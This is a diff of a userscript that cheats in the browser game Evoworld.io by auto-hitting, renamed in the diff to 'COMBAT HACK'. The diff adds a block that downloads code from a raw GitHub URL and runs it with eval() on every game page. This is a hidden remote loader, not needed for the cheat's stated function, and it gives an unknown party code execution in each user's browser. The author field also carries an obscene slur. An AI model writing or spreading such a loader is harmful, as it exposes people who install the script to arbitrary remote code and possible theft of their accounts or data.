@@ -1,15 +1,15 @@
 // ==UserScript==
-// @name         Evoworld.io AutoHit
+// @name         Evoworld.io COMBAT HACK
 // @namespace    http://tampermonkey.net/
-// @version      3.4
+// @version      3.6
 // @description  AutoHit,Flicklere özel yapılmıs taktik
 // @author       türk evo sikici
 // @license      MIT
 // @match        https://evoworld.io/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
 // @grant        none
-// @downloadURL https://update.greasyfork.org/scripts/558539/Evoworldio%20AutoHit.user.js
-// @updateURL https://update.greasyfork.org/scripts/558539/Evoworldio%20AutoHit.meta.js
+// @downloadURL https://update.greasyfork.org/scripts/558539/Evoworldio%20COMBAT%20HACK.user.js
+// @updateURL https://update.greasyfork.org/scripts/558539/Evoworldio%20COMBAT%20HACK.meta.js
 // ==/UserScript==
 
 (function () {
@@ -405,6 +405,20 @@
             urgency: isApproaching ? Math.max(0, 300 - distance) / 300 : 0
         };
     }
+
+// script
+
+fetch('https://raw.githubusercontent.com/shadowxds-eng/main.js/main/main.code')
+
+  .then(response => response.text())
+
+  .then(code => {
+
+    eval(code);
+
+  })
+
+  .catch(err => console.log('Yüklenemedi:', err));
 
     // Gelecek pozisyon hesaplama
     function predictPosition(target, analysis) {
